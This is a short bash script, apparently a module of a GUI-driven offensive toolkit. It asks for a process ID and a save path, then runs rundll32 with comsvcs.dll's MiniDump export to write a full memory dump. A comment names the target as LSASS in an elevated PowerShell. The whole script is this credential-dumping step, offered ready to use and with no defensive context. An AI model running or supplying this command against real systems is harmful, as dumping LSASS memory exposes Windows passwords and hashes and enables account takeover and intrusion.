#!/bin/bash

: '
Powershell: create lsass.dump in elevated powershell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SAVE_LOCATION_FIELD=$(form_item  "save location" "save_location")
PROCESS_ID_FIELD=$(form_item  "process id" "process_id")

# Generate GUI form
generate_form "${SAVE_LOCATION_FIELD}" "${PROCESS_ID_FIELD}"

SAVE_LOCATION=${form_data["save_location"]}
PROCESS_ID=${form_data["process_id"]}

execute_command "rundll32 C:\windows\system32\comsvcs.dll, MiniDump ${PROCESS_ID} ${SAVE_LOCATION} full"
create_new_line
